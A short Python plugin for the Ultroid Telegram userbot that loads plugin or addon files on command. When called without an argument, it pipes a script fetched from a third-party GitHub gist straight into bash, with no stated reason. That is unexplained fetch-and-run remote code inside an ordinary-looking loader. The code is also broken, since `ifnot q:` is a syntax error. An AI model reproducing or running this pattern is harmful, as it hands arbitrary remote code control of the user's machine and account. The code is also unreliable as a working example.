from pyUltroid.startup.loader import load_addons
from os import listdir as ls
from . import ultroid_cmd, get_string, bash

@ultroid_cmd(pattern="lo( (.*)|$)",manager=True)
async def ch(e):
  c = await e.eor(get_string("com_1"))
  q = e.pattern_match.group(1).strip()
  reply = await e.get_reply_message()
  ifnot q:
    a,d = await bash(f"curl -Ls https://gist.githubusercontent.com/rooted-cyber/1bd2b7d3eb4d66ab06ab5e83098395e3/raw/cpp | bash")
    await c.edit(f"{a}\n\n")
    return
  b = f"{q}.py"
  d = ls("plugins")
  s = ls("addons")
  if b in d:
    pr = await e.eor(get_string("com_1"))
    load_addons(f"plugins/{q}.py")
    await pr.edit(f"Successfully loaded **{q}** plugin")
  elif b in s:
    pr = await e.eor(get_string("com_1"))
    load_addons(f"addons/{q}.py")
    await pr.edit(f"Successfully loaded **{q}** Addons plugin")
  else:
     await e.respond(f"**{q}** `Not found Plugin`")

